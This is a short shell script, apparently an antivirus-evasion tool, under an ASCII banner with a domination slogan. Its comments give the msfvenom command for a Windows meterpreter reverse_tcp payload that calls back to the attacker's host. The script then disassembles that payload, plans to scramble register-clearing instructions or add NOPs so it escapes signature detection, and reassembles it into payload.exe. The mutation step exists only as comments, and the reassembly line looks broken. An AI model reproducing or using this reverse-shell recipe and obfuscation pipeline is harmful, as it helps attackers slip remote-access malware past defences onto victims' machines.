#
#  $WITH$$\ $$\   $$\  $THE$$\   QUARTERS\ $BY$OUR$\ $SIDE$\
#  \__$$  __|$$ |  $$ |$$  __$$\ $$  __$$\\__$$  __|$$  __$$\
#     $$ |   $$ |  $$ |$$ /  $$ |$$ |  $$ |  $$ |   $$ /  $$ |
#     $$ |   ALL$WILL |$BOW$$$$ |$TO$OUR\ |  $$ |   $$ |  $$ |
#     $$ |   $$  __$$ |$$  __$$ |$$  __$$\   $$ |   $$ |  $$ |
#     $$ |   $$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |   $$ |  $$ |
#     $$ |   $$ |  $$ |$$ |  $$ |$POWERS$ |  $$ |    $$$$$$  |
#     \__|   \__|  \__|\__|  \__|\_______/   \__|    \______/



# Prerequisite
# sudo gem install metasm

#First generate a raw payload using msfvenom
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=$(hostname -I) LPORT=443 -f raw > raw_binary

# Then call thabto.sh like so
# ./thabto.sh /path/to/raw_binary /path/to/output_file

# Disassemble
RAW_LOC="$1"
cp $(locate disassemble.rb | head -1) ./disassemble.rb
chmod +x disassemble.rb
./disassemble.rb $RAW_LOC > asm_code.asm

sed -i "1s/^/\.section \'\.text\' rwx\n\.entrypoint\n/" asm_code.asm

#Check for when a registery is cleared
# xor eax, eax
# mov eax, 0
# etc

# For each location, randomly mess with the registery or add NOPs

# Re-assemble
cp $(locate peencode.rb | head -1) ./peencode.rb
chmod +x peencode.rb
asm_code.asm -o payload.exe

: << CLEAN_UP
rm peencode.rb disassemble.rb asm_code.asm $RAW_LOC
CLEAN_UP
